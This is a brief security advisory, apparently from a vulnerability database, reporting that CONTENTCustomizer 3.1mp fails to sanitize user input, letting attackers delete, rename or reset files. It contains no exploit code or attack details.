CONTENTCustomizer is prone to an unauthorized access vulnerability because the application fails to sufficiently sanitize user-supplied input.

An attacker could exploit this issue to delete arbitrary files, rename files, or reset the content of certain files.

CONTENTCustomizer 3.1mp is vulnerable; other versions may also be affected.
